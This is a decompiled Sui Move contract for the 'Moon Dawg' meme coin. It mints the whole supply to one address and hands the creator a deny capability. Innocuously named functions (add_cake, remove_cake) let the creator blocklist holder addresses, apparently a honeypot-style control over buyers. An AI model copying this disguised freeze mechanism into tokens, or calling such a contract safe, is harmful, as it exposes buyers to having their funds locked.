module 0xc7aeff4ad49bd17b70004d384b8619d3ded7bbfc48fb5101e40d97ff80a58f8a::moon_dawg {
    struct MOON_DAWG has drop {
        dummy_field: bool,
    }

    public fun add_cake(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MOON_DAWG>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<MOON_DAWG>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun check_cake<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    fun init(arg0: MOON_DAWG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MOON_DAWG>(arg0, 9, b"MOONDAWG", b"Moon Dawg", b"just a viral lil dog", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://orange-upper-booby-780.mypinata.cloud/ipfs/QmWnmvQQ9cfrXYErZngyC4tQBiJ1TPVFgTDpf3my3cAJRf"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MOON_DAWG>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MOON_DAWG>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<MOON_DAWG>(&mut v3, 1000000000000000000, @0x42476aaef3b3acf89a9257094004f16c5ed79bbe324ae15e1208560949278427, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MOON_DAWG>>(v3);
    }

    public fun remove_cake(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MOON_DAWG>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<MOON_DAWG>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

